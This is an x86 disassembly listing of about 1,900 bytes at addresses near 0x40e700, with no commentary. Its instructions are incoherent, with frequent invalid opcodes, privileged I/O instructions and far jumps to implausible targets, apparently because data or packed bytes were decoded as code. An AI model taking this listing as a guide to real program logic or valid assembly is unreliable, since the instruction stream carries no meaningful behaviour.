  40e71e:	adc    eax,0x4a31a4bb
  40e723:	jle    0x40e756
  40e725:	into   
  40e726:	inc    edi
  40e727:	pop    ecx
  40e728:	mov    eax,ds:0x86a82490
  40e72d:	adc    BYTE PTR [ebx-0x10],0x9c
  40e731:	sub    eax,DWORD PTR [ebp-0x54a83dbc]
  40e737:	xchg   DWORD PTR [ebx+0x656ffc75],ebx
  40e73d:	xor    al,BYTE PTR [ecx+esi*2]
  40e740:	adc    eax,0xe74f20d6
  40e745:	mov    eax,DWORD PTR [esi-0x5d]
  40e748:	imul   edi,DWORD PTR [edi+0xe],0xc779d0d
  40e74f:	pop    edx
  40e750:	pop    edi
  40e751:	scas   eax,DWORD PTR es:[edi]
  40e752:	dec    ebx
  40e753:	or     DWORD PTR [eax-0x7a377649],ecx
  40e759:	loopne 0x40e724
  40e75b:	dec    ebp
  40e75d:	loope  0x40e731
  40e75f:	aad    0x7a
  40e761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e762:	xor    BYTE PTR [edi],bh
  40e764:	dec    ebx
  40e765:	add    edx,DWORD PTR [esi-0x23797abf]
  40e76b:	nop
  40e76c:	es mov al,dl
  40e76f:	icebp  
  40e770:	out    dx,eax
  40e771:	mov    edi,0xb52c1b2f
  40e776:	je     0x40e732
  40e778:	jmp    0x40e7a2
  40e77a:	xor    eax,ebx
  40e77c:	xor    BYTE PTR [ebp-0x557187e6],ch
  40e782:	adc    al,0xa5
  40e784:	adc    esi,DWORD PTR fs:[ecx]
  40e787:	xchg   edi,eax
  40e788:	rep ins BYTE PTR es:[edi],dx
  40e78a:	mov    dl,0x6b
  40e78c:	add    eax,DWORD PTR [ebp-0x66]
  40e78f:	leave  
  40e790:	dec    esi
  40e791:	fst    DWORD PTR [ebx-0x361946]
  40e797:	call   0xff0519d
  40e79c:	sbb    eax,0x5dfbd1af
  40e7a1:	repz mov eax,ds:0x487c25f1
  40e7a7:	inc    edx
  40e7a8:	fadd   QWORD PTR [esi-0x50]
  40e7ab:	xlat   BYTE PTR ds:[ebx]
  40e7ac:	in     al,dx
  40e7ad:	aam    0xa2
  40e7af:	sbb    cl,BYTE PTR [esi+0x3c]
  40e7b2:	fild   WORD PTR [ebx+0x1a0601a7]
  40e7b8:	retf   0x96b4
  40e7bb:	mov    eax,ds:0x5d9c4b65
  40e7c0:	adc    eax,0xb03368e
  40e7c5:	xor    ecx,DWORD PTR [esi-0x328acd37]
  40e7cb:	fdivr  DWORD PTR [edx+edx*4]
  40e7ce:	dec    ebx
  40e7cf:	cmp    ecx,DWORD PTR [edi+edx*2-0x78678fac]
  40e7d6:	dec    esi
  40e7d7:	cld    
  40e7d8:	loop   0x40e7cd
  40e7da:	loopne 0x40e7ca
  40e7dc:	adc    BYTE PTR [ecx+0x5577bad7],ah
  40e7e2:	or     dh,BYTE PTR [ebx-0x5d48c1c5]
  40e7e8:	mov    BYTE PTR [edx+0x34ac8855],bh
  40e7ee:	and    cl,ch
  40e7f0:	fsubr  DWORD PTR [ebx+0x4bb98b25]
  40e7f6:	inc    esi
  40e7f7:	push   edx
  40e7f8:	jecxz  0x40e86d
  40e7fa:	sub    bh,BYTE PTR [ebx+edx*1-0x5511d1c3]
  40e801:	mov    bl,0xaf
  40e803:	iret   
  40e804:	aaa    
  40e805:	(bad)  
  40e806:	shl    ah,0x25
  40e809:	push   0xffffff87
  40e80b:	ror    DWORD PTR [ebp+0x62],0x9e
  40e80f:	sbb    eax,0xaa68d41c
  40e814:	test   DWORD PTR [ecx],ebx
  40e816:	jnp    0x40e7bf
  40e818:	push   ds
  40e819:	inc    edi
  40e81a:	add    ah,bl
  40e81c:	jmp    FWORD PTR [ebp-0x7d32297f]
  40e822:	sub    DWORD PTR [edi+0x66],esp
  40e825:	loope  0x40e8a5
  40e827:	dec    esp
  40e828:	in     eax,0xd4
  40e82a:	pop    edx
  40e82b:	stos   BYTE PTR es:[edi],al
  40e82c:	add    esp,DWORD PTR [edx-0x1a0830ae]
  40e832:	mov    ch,0xd0
  40e834:	jle    0x40e850
  40e836:	fcmovb st,st(2)
  40e838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e839:	test   al,0x39
  40e83b:	rdpmc  
  40e83d:	sbb    ebx,DWORD PTR [eax]
  40e83f:	imul   ecx,DWORD PTR [ecx+0x2bfbbcf1],0xad467aa
  40e849:	jae    0x40e8b7
  40e84b:	stos   BYTE PTR es:[edi],al
  40e84c:	sub    eax,0x4348f8c6
  40e851:	aad    0x24
  40e853:	push   0xffffffee
  40e855:	jo     0x40e804
  40e857:	xchg   ecx,eax
  40e858:	jbe    0x40e8d8
  40e85a:	iret   
  40e85b:	int3   
  40e85c:	cmp    DWORD PTR [eax+0x63584094],esi
  40e862:	sub    DWORD PTR [ecx+0x59],ecx
  40e865:	(bad)  [ebp+0x6c]
  40e868:	addr16 push 0x3877ecb1
  40e86e:	sub    DWORD PTR [edx],ecx
  40e870:	push   0x732d2b53
  40e875:	push   0x4
  40e877:	test   DWORD PTR ds:0x68b20bb5,0x79667f73
  40e881:	push   edx
  40e882:	add    DWORD PTR [esi],esi
  40e884:	inc    edi
  40e885:	mov    ebp,0x47fd5a27
  40e88a:	sbb    DWORD PTR [ebx],ebp
  40e88c:	ins    BYTE PTR es:[edi],dx
  40e88d:	and    esp,0xffffffb7
  40e890:	add    al,0x7d
  40e892:	adc    eax,0xc6fdc00d
  40e897:	xchg   esi,eax
  40e898:	or     ch,BYTE PTR ds:0xd6ee96e7
  40e89e:	gs es cmc 
  40e8a1:	mov    bh,0xde
  40e8a3:	inc    esi
  40e8a4:	out    dx,al
  40e8a5:	push   0x59
  40e8a7:	and    DWORD PTR [esi+0x18],edx
  40e8aa:	movsx  esp,WORD PTR [edx]
  40e8ad:	data16 in al,dx
  40e8af:	sub    eax,ebx
  40e8b1:	and    BYTE PTR [edi-0x1c],ah
  40e8b4:	mov    ebp,0xd9c84eec
  40e8b9:	in     eax,dx
  40e8ba:	(bad)  
  40e8bb:	push   edi
  40e8bc:	mov    al,0xcf
  40e8be:	and    eax,0x4b6c4256
  40e8c3:	push   edi
  40e8c4:	xchg   edi,eax
  40e8c5:	and    al,0x18
  40e8c7:	ins    DWORD PTR es:[edi],dx
  40e8c8:	push   esi
  40e8c9:	aam    0xbc
  40e8cb:	test   eax,0x68be86b4
  40e8d0:	fmul   st,st(5)
  40e8d2:	xor    ch,BYTE PTR [edx]
  40e8d4:	push   edx
  40e8d5:	fldenv [esp+esi*1+0xe]
  40e8d9:	xchg   ebp,eax
  40e8da:	xor    BYTE PTR [edi+0x39ec15ee],bl
  40e8e0:	pusha  
  40e8e1:	mov    eax,ds:0x665dd180
  40e8e6:	fnstsw WORD PTR [esi+0x72]
  40e8e9:	(bad)  
  40e8eb:	pop    ebx
  40e8ec:	fldenv [edx+0x45]
  40e8ef:	adc    DWORD PTR [edi+ecx*4],0xffffffa2
  40e8f3:	cmp    BYTE PTR [eax-0x65],bl
  40e8f6:	scas   al,BYTE PTR es:[edi]
  40e8f7:	out    dx,al
  40e8f8:	inc    edx
  40e8f9:	adc    edi,esi
  40e8fb:	dec    edi
  40e8fc:	sub    esp,DWORD PTR [ecx+0x72]
  40e8ff:	cmp    eax,0x1c567bdc
  40e904:	xor    BYTE PTR [eax+0x17a0efc9],al
  40e90a:	std    
  40e90b:	repnz inc esp
  40e90d:	dec    ebp
  40e90e:	mov    bh,0x2a
  40e910:	pop    es
  40e911:	xor    bh,al
  40e913:	and    BYTE PTR [eax+edi*4+0x2c],ah
  40e917:	push   esi
  40e918:	fcmove st,st(0)
  40e91a:	mov    dh,bh
  40e91c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e91d:	adc    DWORD PTR [edx],esi
  40e91f:	test   al,0x1d
  40e921:	in     al,dx
  40e922:	jae    0x40e943
  40e924:	fdivp  st(0),st
  40e926:	fst    DWORD PTR [eax+0x2228e903]
  40e92c:	fwait
  40e92d:	icebp  
  40e92e:	test   DWORD PTR [ecx+0x6c],edx
  40e931:	dec    edx
  40e932:	call   0x85cdc2d8
  40e937:	jnp    0x40e8fd
  40e939:	test   eax,0x382be316
  40e93e:	out    dx,al
  40e93f:	loopne 0x40e91f
  40e941:	stc    
  40e942:	out    0xc0,al
  40e944:	psrlq  mm7,QWORD PTR [edx-0x25]
  40e948:	xor    BYTE PTR [eax-0xa],0xa8
  40e94c:	push   ebp
  40e94d:	adc    al,0x7c
  40e94f:	inc    ebp
  40e950:	mov    esi,0x5aa3ed52
  40e955:	iret   
  40e956:	pop    ds
  40e957:	xchg   edx,eax
  40e958:	fs lock aaa 
  40e95b:	pop    ebp
  40e95c:	fst    DWORD PTR [edx*1+0x3188b7f6]
  40e963:	push   ecx
  40e964:	ror    DWORD PTR [esi+0x7def8c1c],cl
  40e96a:	inc    edi
  40e96b:	dec    esi
  40e96c:	inc    esp
  40e96d:	inc    ecx
  40e96e:	push   es
  40e96f:	js     0x40e91b
  40e971:	loope  0x40e9be
  40e973:	xchg   ecx,eax
  40e974:	or     al,0x35
  40e976:	xor    edi,DWORD PTR [ecx+esi*4-0x3f]
  40e97a:	loope  0x40e933
  40e97c:	mov    ebx,0xd7cc2541
  40e981:	test   ah,0x53
  40e984:	es jb  0x40e9d2
  40e987:	mov    edx,0x2448e193
  40e98c:	inc    eax
  40e98d:	sar    DWORD PTR [edx],0xa7
  40e990:	lods   al,BYTE PTR ds:[esi]
  40e991:	int3   
  40e992:	and    cl,dh
  40e994:	sbb    BYTE PTR [eax+0x290b8e1b],al
  40e99a:	outs   dx,BYTE PTR ds:[esi]
  40e99b:	fistp  WORD PTR [esi+0x12bd31c3]
  40e9a1:	test   al,0x4
  40e9a3:	in     eax,0x1d
  40e9a5:	call   0xcf45f1f
  40e9aa:	stos   BYTE PTR es:[edi],al
  40e9ab:	fadd   DWORD PTR [edx+0x344ff0b6]
  40e9b1:	xor    eax,0xb774d864
  40e9b6:	pop    ecx
  40e9b7:	sbb    edx,DWORD PTR [eax+0x43]
  40e9ba:	push   ecx
  40e9bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9bc:	lods   eax,DWORD PTR ds:[esi]
  40e9bd:	xchg   ebp,eax
  40e9be:	push   ds
  40e9bf:	fst    QWORD PTR [edx-0x8]
  40e9c2:	fcomp  st(4)
  40e9c4:	add    DWORD PTR [edx+0x3b],0x4b2c8acf
  40e9cb:	dec    BYTE PTR [esi+0x6c]
  40e9ce:	mov    ds:0x45791fac,eax
  40e9d4:	les    ebp,FWORD PTR ds:0x4127aa70
  40e9da:	mov    bl,0x1
  40e9dc:	push   cs
  40e9dd:	(bad)  
  40e9de:	imul   edi,DWORD PTR ds:0xe9c5bbd9,0xfffffff2
  40e9e5:	dec    esi
  40e9e6:	outs   dx,BYTE PTR ds:[esi]
  40e9e7:	lods   eax,DWORD PTR ds:[esi]
  40e9e8:	jo     0x40ea26
  40e9ea:	test   DWORD PTR [ecx+0x6b2ca54d],ebp
  40e9f0:	test   DWORD PTR [ecx-0x58],edi
  40e9f3:	sub    eax,0xd7817baf
  40e9f8:	mov    esp,0xc8228c45
  40e9fd:	fild   QWORD PTR [edx]
  40e9ff:	pusha  
  40ea00:	cs out 0x5a,al
  40ea03:	fsubr  QWORD PTR [eax+0x10a6404b]
  40ea09:	xchg   edi,eax
  40ea0a:	fmul   DWORD PTR [eax+0x4f]
  40ea0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea0e:	xchg   DWORD PTR [eax-0x4123c5bd],esi
  40ea14:	xor    eax,0x59218ae4
  40ea19:	stos   BYTE PTR es:[edi],al
  40ea1a:	push   esp
  40ea1b:	aam    0x9
  40ea1d:	loope  0x40ea40
  40ea1f:	sub    ebx,edx
  40ea21:	sbb    eax,0xe10e3d7b
  40ea26:	repz xor eax,0xa1f0732f
  40ea2c:	nop
  40ea2d:	mov    dh,0xf
  40ea2f:	sub    eax,0xd5872b4
  40ea34:	call   0x3955040c
  40ea39:	nop
  40ea3a:	and    edx,DWORD PTR [esi-0x48]
  40ea3d:	xchg   esi,eax
  40ea3e:	pop    ebp
  40ea3f:	fdivp  st(5),st
  40ea41:	das    
  40ea42:	mov    al,ds:0x62a87419
  40ea47:	gs mov dh,0x94
  40ea4a:	mov    DWORD PTR [edx-0x6],esi
  40ea4d:	dec    ebx
  40ea4e:	push   edx
  40ea4f:	mov    esp,0xf26574fc
  40ea54:	mov    edx,0x9c760780
  40ea59:	push   ds
  40ea5a:	outs   dx,BYTE PTR ds:[esi]
  40ea5b:	mov    al,ds:0xc9a84868
  40ea60:	adc    esi,DWORD PTR [ebx]
  40ea62:	jp     0x40ea21
  40ea64:	(bad)  
  40ea66:	inc    edx
  40ea67:	ror    BYTE PTR [ecx+0x5d],0x6f
  40ea6b:	out    dx,al
  40ea6c:	xor    BYTE PTR [edi-0x5592e2a1],ah
  40ea72:	shr    BYTE PTR [eax],0x1d
  40ea75:	xchg   ecx,eax
  40ea76:	nop
  40ea77:	inc    eax
  40ea78:	je     0x40ea4c
  40ea7a:	mov    ecx,edi
  40ea7c:	mov    DWORD PTR [ecx+0x392a8935],ebp
  40ea82:	and    edi,DWORD PTR [esi]
  40ea84:	xchg   edi,eax
  40ea85:	fld    QWORD PTR [eax]
  40ea87:	adc    ah,ah
  40ea89:	mov    eax,0x2250c53
  40ea8e:	mov    eax,0x7b31d39e
  40ea93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea94:	xor    ah,al
  40ea96:	lock jns 0x40ea95
  40ea99:	jbe    0x40ea24
  40ea9b:	daa    
  40ea9c:	cli    
  40ea9d:	daa    
  40ea9e:	and    eax,0x668784dc
  40eaa3:	jnp    0x40eae7
  40eaa5:	imul   ecx,DWORD PTR [edi+0x4b59be92],0x4b15dd9c
  40eaaf:	xchg   edx,eax
  40eab0:	sub    ebp,ebx
  40eab2:	mov    edx,ds
  40eab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eab5:	ja     0x40eaa1
  40eab7:	cdq    
  40eab8:	jno    0x40eb23
  40eaba:	mov    dl,0x8a
  40eabc:	lods   al,BYTE PTR ds:[esi]
  40eabd:	mov    ebx,0x45aee3e6
  40eac2:	popa   
  40eac3:	add    ch,ah
  40eac5:	pop    ecx
  40eac6:	add    eax,0xeb07b48b
  40eacb:	(bad)  
  40eacc:	sti    
  40eacd:	fidivr DWORD PTR [ecx+edx*4-0x7e]
  40ead1:	push   edi
  40ead2:	jmp    0x40eb14
  40ead4:	or     BYTE PTR [edx-0x8],cl
  40ead7:	or     dl,bh
  40ead9:	hlt    
  40eada:	or     eax,0x630c8a9
  40eadf:	rcr    WORD PTR [ebp+0x4445c0c0],1
  40eae6:	adc    esp,esp
  40eae8:	ret    0xe8f1
  40eaeb:	dec    eax
  40eaec:	cmc    
  40eaed:	cli    
  40eaee:	fisttp WORD PTR [esi-0x14dd122]
  40eaf4:	jae    0x40eaa8
  40eaf6:	mov    esp,0x4ad088e5
  40eafb:	add    DWORD PTR [esi],ecx
  40eafd:	adc    DWORD PTR [edx+0x13],ecx
  40eb00:	or     BYTE PTR [esi],dl
  40eb02:	dec    ebx
  40eb03:	iret   
  40eb04:	or     ebp,DWORD PTR [ebp-0x25ff5a54]
  40eb0a:	pop    edi
  40eb0b:	cmp    ebx,esi
  40eb0d:	cdq    
  40eb0e:	dec    esp
  40eb0f:	adc    bl,al
  40eb11:	in     eax,dx
  40eb12:	int    0x3
  40eb14:	gs adc DWORD PTR ss:[esi-0x73],edx
  40eb19:	jae    0x40ead9
  40eb1b:	fistp  QWORD PTR [ebx-0x7f]
  40eb1e:	scas   al,BYTE PTR es:[edi]
  40eb1f:	out    dx,al
  40eb20:	retf   0x19fb
  40eb23:	into   
  40eb24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb25:	je     0x40eb78
  40eb27:	sbb    BYTE PTR [ebp+0x67],al
  40eb2a:	ret    
  40eb2b:	xchg   ebx,edi
  40eb2d:	arpl   WORD PTR [esi-0x75],bp
  40eb30:	sbb    al,0x43
  40eb32:	pop    es
  40eb33:	mov    ah,0x9d
  40eb35:	fld    DWORD PTR [ebx+0x1c7ad156]
  40eb3b:	xchg   ecx,eax
  40eb3c:	sub    BYTE PTR [edi+0x32],dl
  40eb3f:	push   cs
  40eb40:	sbb    BYTE PTR [ebp-0x61],ah
  40eb43:	in     eax,dx
  40eb44:	loope  0x40eb7c
  40eb46:	adc    ebx,DWORD PTR [ecx+0xe1822f7]
  40eb4c:	dec    ebx
  40eb4d:	call   0xdde3620a
  40eb52:	sub    al,0xf6
  40eb54:	push   ecx
  40eb56:	xchg   ebx,eax
  40eb57:	sub    al,cl
  40eb59:	or     ch,bh
  40eb5b:	sub    eax,0xefed9ec0
  40eb60:	stos   BYTE PTR es:[edi],al
  40eb61:	fisttp DWORD PTR [eax]
  40eb63:	add    bl,dh
  40eb65:	jmp    0x40eb02
  40eb67:	cmp    eax,0x33b82a5
  40eb6c:	stc    
  40eb6d:	mov    BYTE PTR [ecx+0x3d],0xbc
  40eb71:	push   edx
  40eb72:	inc    esi
  40eb73:	sub    eax,0x44d7f52a
  40eb78:	push   es
  40eb79:	xor    al,0xb5
  40eb7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb7c:	push   ss
  40eb7d:	daa    
  40eb7e:	dec    ecx
  40eb7f:	and    esi,DWORD PTR [ebx-0x73]
  40eb82:	add    BYTE PTR [edx-0x80],ah
  40eb85:	fisttp QWORD PTR [ecx-0x49585ace]
  40eb8b:	xchg   edi,eax
  40eb8c:	lea    esi,[ecx]
  40eb8e:	mov    edi,ss
  40eb90:	adc    BYTE PTR [edx],cl
  40eb92:	push   ebx
  40eb93:	outs   dx,BYTE PTR ds:[esi]
  40eb94:	es pop esp
  40eb96:	loopne 0x40ec03
  40eb98:	leave  
  40eb99:	jecxz  0x40eb2e
  40eb9b:	mov    ebp,0x25540e12
  40eba0:	repnz xor al,0x51
  40eba3:	dec    edx
  40eba4:	dec    ebx
  40eba5:	data16 ja 0x40eb71
  40eba8:	jmp    0x60b335b0
  40ebad:	adc    bl,al
  40ebaf:	addr16 gs dec eax
  40ebb2:	fmul   DWORD PTR [ebp-0x114f24fe]
  40ebb8:	pop    ebp
  40ebb9:	setae  BYTE PTR cs:[edx]
  40ebbd:	jmp    0xece268bb
  40ebc2:	and    BYTE PTR [edi+0x2c],bh
  40ebc5:	dec    ecx
  40ebc6:	lds    ebp,FWORD PTR [esi-0x1837c228]
  40ebcc:	shl    BYTE PTR [edx],1
  40ebce:	dec    ecx
  40ebcf:	pushf  
  40ebd0:	mov    bl,BYTE PTR [edx-0x58]
  40ebd3:	out    0xd9,al
  40ebd5:	pop    ebp
  40ebd6:	mov    bh,0x3c
  40ebd8:	in     al,dx
  40ebd9:	push   eax
  40ebda:	jmp    0x39b4d82
  40ebdf:	enter  0xb8e5,0x6c
  40ebe3:	test   eax,0xcad75ce8
  40ebe8:	sub    DWORD PTR [ecx-0x4d4b4af9],esi
  40ebee:	inc    edi
  40ebef:	sbb    dl,dh
  40ebf1:	stos   DWORD PTR es:[edi],eax
  40ebf2:	(bad)  
  40ebf3:	xlat   BYTE PTR ds:[ebx]
  40ebf4:	cli    
  40ebf5:	inc    eax
  40ebf6:	inc    edi
  40ebf7:	cmp    BYTE PTR [ecx+0x7a],0x27
  40ebfb:	pop    ecx
  40ebfc:	sbb    BYTE PTR [ebx+0x7cea4d1d],0xd6
  40ec03:	xlat   BYTE PTR ds:[ebx]
  40ec04:	out    dx,eax
  40ec05:	arpl   WORD PTR [ebx+0x57],bx
  40ec08:	cwde   
  40ec09:	jns    0x40ec0b
  40ec0b:	aam    0xe7
  40ec0d:	xor    al,0x52
  40ec0f:	jg     0x40ec1c
  40ec11:	dec    ebp
  40ec12:	mov    esp,DWORD PTR [ebx+0x2aa203db]
  40ec18:	adc    edi,DWORD PTR [ebx+0x60]
  40ec1b:	frstor [eax]
  40ec1d:	sti    
  40ec1e:	test   DWORD PTR [esi],esp
  40ec20:	jmp    0x9ab7:0x1ee2b224
  40ec27:	sub    ecx,ebx
  40ec29:	mov    ebp,0x4ca5b4e5
  40ec2e:	jp     0x40ec9d
  40ec30:	imul   eax,DWORD PTR [eax+0x323d65a4],0x14
  40ec37:	sahf   
  40ec38:	mov    ebx,0xed607514
  40ec3d:	call   0x2fd4:0xb85b4b71
  40ec44:	(bad)  
  40ec45:	fxch   st(6)
  40ec47:	sub    DWORD PTR [edi],0x50cdd3eb
  40ec4d:	aas    
  40ec4e:	cmp    BYTE PTR [esi+0x1e],al
  40ec51:	pop    edi
  40ec52:	jae    0x40ebe7
  40ec54:	leave  
  40ec55:	ret    0xf423
  40ec58:	jae    0x40ec96
  40ec5a:	loope  0x40ec82
  40ec5c:	iret   
  40ec5d:	push   0xffffffc6
  40ec5f:	kmovb  k6,k2
  40ec63:	nop
  40ec64:	shl    BYTE PTR [edx-0x19],cl
  40ec67:	push   ebx
  40ec68:	addr16 (bad) 
  40ec6a:	inc    ebx
  40ec6b:	mov    al,ds:0x27005f50
  40ec70:	neg    BYTE PTR [edx]
  40ec72:	stos   DWORD PTR es:[edi],eax
  40ec73:	out    0xed,eax
  40ec75:	rcr    BYTE PTR [eax],1
  40ec77:	(bad)  
  40ec79:	test   eax,0x8ec93dfe
  40ec7e:	loopne 0x40ecbc
  40ec80:	mov    ds:0x2f5d7b31,eax
  40ec85:	ret    0x5f21
  40ec88:	add    DWORD PTR [edi+0x1d],edx
  40ec8b:	inc    ecx
  40ec8c:	retf   0x3b6c
  40ec8f:	and    al,0xd2
  40ec91:	test   al,0x38
  40ec93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec94:	lods   al,BYTE PTR ds:[esi]
  40ec95:	cwde   
  40ec96:	xchg   ecx,eax
  40ec97:	shl    ecx,1
  40ec99:	stc    
  40ec9a:	cli    
  40ec9b:	adc    eax,0x2b971bce
  40eca0:	push   edi
  40eca1:	mov    ecx,DWORD PTR [edi+0x3c9dd994]
  40eca7:	and    eax,0xae38a3bc
  40ecac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecad:	jmp    0x88ad6edb
  40ecb2:	adc    BYTE PTR [eax+edx*4+0x4],bl
  40ecb6:	adc    DWORD PTR [eax],0xffffff9d
  40ecb9:	mov    WORD PTR [eax],ds
  40ecbb:	jl     0x40ec6e
  40ecbd:	sub    DWORD PTR [eax-0x2d9109b8],esi
  40ecc3:	inc    esp
  40ecc4:	cwde   
  40ecc5:	pushf  
  40ecc6:	dec    eax
  40ecc7:	scas   al,BYTE PTR es:[edi]
  40ecc8:	mov    dl,0x20
  40ecca:	clc    
  40eccb:	jle    0x40ec93
  40eccd:	dec    edi
  40ecce:	or     eax,0xb08c200d
  40ecd3:	(bad)  
  40ecd4:	sbb    bh,BYTE PTR [ecx-0x7f]
  40ecd7:	fwait
  40ecd8:	mov    dh,0x31
  40ecda:	jae    0x40ed1a
  40ecdc:	addr16 call 0x86e8:0x8ff4
  40ece3:	(bad)  
  40ece4:	add    ebx,DWORD PTR [ebx+0x40d7ab26]
  40ecea:	pusha  
  40eceb:	mov    dl,0x73
  40eced:	push   0xa5ca1cc8
  40ecf2:	imul   esi,DWORD PTR [ecx-0x564f6add],0x2b0b857a
  40ecfc:	shl    BYTE PTR [esi],0xfd
  40ecff:	ss (bad) 
  40ed01:	lods   eax,DWORD PTR ds:[esi]
  40ed02:	adc    al,0x9d
  40ed04:	jge    0x40ed60
  40ed06:	out    0xf3,al
  40ed08:	mov    DWORD PTR [esi],edx
  40ed0a:	(bad)  
  40ed0b:	push   0x26
  40ed0d:	cmp    eax,0xd21d8b2f
  40ed12:	jle    0x40ed47
  40ed14:	inc    edi
  40ed15:	sti    
  40ed16:	adc    cl,bh
  40ed18:	ss icebp 
  40ed1a:	and    bl,bl
  40ed1c:	jo     0x40ecff
  40ed1e:	xor    DWORD PTR ds:[edx-0x6],esi
  40ed22:	loope  0x40ed2e
  40ed24:	(bad)  
  40ed25:	mov    esp,0x17c195aa
  40ed2a:	sub    al,0xe9
  40ed2c:	cmp    al,0xa8
  40ed2e:	xor    cl,BYTE PTR [esp+esi*8]
  40ed31:	call   0xe972:0xb7ef40aa
  40ed38:	push   ds
  40ed39:	and    ecx,DWORD PTR [ecx-0xd]
  40ed3c:	cwde   
  40ed3d:	je     0x40edab
  40ed3f:	je     0x40ed35
  40ed41:	outs   dx,BYTE PTR ds:[esi]
  40ed42:	xor    DWORD PTR [edi+0x3fa2d2f8],ebx
  40ed48:	inc    eax
  40ed49:	imul   edi,DWORD PTR [edi+0x7e],0x454698e2
  40ed50:	jge    0x40edb4
  40ed52:	cmp    DWORD PTR [edx+0x7879e5cb],ebp
  40ed58:	xchg   ebp,eax
  40ed59:	and    eax,0xeaf1f816
  40ed5e:	faddp  st(7),st
  40ed60:	pushf  
  40ed61:	stc    
  40ed62:	jge    0x40ed88
  40ed64:	fcmove st,st(6)
  40ed66:	test   ebp,ecx
  40ed68:	xor    eax,0x463af10c
  40ed6d:	test   eax,0xf0313052
  40ed72:	mov    ds:0x58eca534,eax
  40ed77:	mov    ebp,0x8882bcfc
  40ed7c:	inc    ebp
  40ed7d:	mov    eax,esi
  40ed7f:	adc    edi,DWORD PTR [eax-0x29]
  40ed82:	mov    esp,0x7ee9666d
  40ed87:	fcom   QWORD PTR ds:0x9288ea39
  40ed8d:	sbb    esi,edi
  40ed8f:	ins    BYTE PTR es:[edi],dx
  40ed90:	es add eax,0xb9aaa8d2
  40ed96:	push   es
  40ed97:	mov    edi,0xacb734a1
  40ed9c:	cmp    esp,DWORD PTR [edx]
  40ed9e:	mov    eax,ds:0xf46977b6
  40eda3:	out    0x2d,eax
  40eda5:	or     ebx,DWORD PTR [esi]
  40eda7:	push   0x4
  40eda9:	xor    BYTE PTR [edi+0x59],al
  40edac:	xchg   ebx,eax
  40edad:	inc    ecx
  40edae:	shl    DWORD PTR [esi+0x59e407e4],0xa1
  40edb5:	mov    ebx,0x2b5740ff
  40edba:	cli    
  40edbb:	push   cs
  40edbc:	test   DWORD PTR [edx-0x5d],eax
  40edbf:	add    al,0xd
  40edc1:	push   es
  40edc2:	test   DWORD PTR [ecx+esi*2-0x6e],0x525fe442
  40edca:	iret   
  40edcb:	sbb    ecx,DWORD PTR fs:0x53530b51
  40edd2:	aam    0xdc
  40edd4:	ins    BYTE PTR es:[edi],dx
  40edd5:	rol    BYTE PTR [ebx+0x2c],1
  40edd8:	(bad)
  40eddb:	mov    cl,0x33
  40eddd:	xchg   DWORD PTR [esi-0x419079bb],ebp
  40ede3:	mov    ecx,0xab29fd8
  40ede8:	stos   BYTE PTR es:[edi],al
  40ede9:	mov    cl,0xfc
  40edeb:	test   ecx,ebx
  40eded:	add    al,0x6e
  40edef:	dec    esi
  40edf0:	dec    esi
  40edf1:	fsub   st(6),st
  40edf3:	push   ecx
  40edf4:	mov    ch,0xa5
  40edf6:	jae    0x40ed81
  40edf8:	dec    ecx
  40edf9:	sub    al,0x60
  40edfb:	clc    
  40edfc:	or     BYTE PTR [esp+ecx*1],0x4a
  40ee00:	test   ah,al
  40ee02:	pop    edi
  40ee03:	aas    
  40ee04:	add    DWORD PTR [edi-0x36],edx
  40ee07:	and    eax,0x6d636018
  40ee0c:	lods   al,BYTE PTR ds:[esi]
  40ee0d:	pop    ebx
  40ee0e:	imul   edx,esp,0x20
  40ee11:	xor    al,0x11
  40ee13:	int3   
  40ee14:	les    eax,FWORD PTR ds:0xb7519296
  40ee1a:	pop    edx
  40ee1b:	in     al,dx
  40ee1c:	mov    eax,0x491c5418
  40ee21:	into   
  40ee22:	xor    al,0xb5
  40ee24:	adc    al,0x7f
  40ee26:	test   eax,0x86941a4e
  40ee2b:	push   esp
  40ee2c:	lods   al,BYTE PTR ds:[esi]
  40ee2d:	cmp    ebp,ecx
  40ee2f:	pop    ecx
  40ee30:	add    dl,dl
  40ee32:	mov    dl,0x80
  40ee34:	into   
  40ee35:	push   esp
  40ee36:	sub    BYTE PTR [eax+0x675ac6bc],bl
  40ee3c:	jb     0x40eebb
  40ee3e:	push   ds
  40ee3f:	sub    al,0xfd
  40ee41:	cdq    
  40ee42:	mov    esi,0x8030e27f
  40ee47:	mov    ecx,0x243c9fb4
  40ee4c:	clc    
  40ee4d:	pop    ds
  40ee4e:	pusha  
  40ee4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee50:	adc    eax,0x9e016ed
  40ee55:	dec    eax
  40ee56:	mov    WORD PTR [edx+0x380cad43],fs
  40ee5c:	xor    ah,BYTE PTR [eax-0x55]
  40ee5f:	sub    al,0x88
  40ee61:	enter  0xb605,0xe9
  40ee65:	mov    edx,0x98a2bfff
  40ee6a:	add    ebp,esp
  40ee6c:	sub    BYTE PTR [eax-0x66],0xb5
  40ee70:	adc    esp,DWORD PTR [eax+0x7f]
  40ee73:	adc    eax,0x6626495d
  40ee78:	add    eax,0x340a7dac
  40ee7d:	pusha  
  40ee7e:	lds    esi,FWORD PTR [ebx-0x32]
  40ee81:	sbb    edi,edx
  40ee83:	sbb    DWORD PTR [ecx-0x5e],ecx
  40ee86:	aas    
  40ee87:	sar    DWORD PTR [ecx],1
  40ee89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee8a:	jns    0x40ee81
  40ee8c:	jno    0x40eead
  40ee8e:	jmp    0x40eeba
  40ee90:	sahf   
  40ee91:	nop
  40ee92:	(bad)  
  40ee93:	std    
  40ee94:	lea    ebp,[ebx]
  40ee96:	ror    DWORD PTR [ecx-0x75b9d79a],0x1e
  40ee9d:	js     0x40ee3a
  40ee9f:	dec    eax
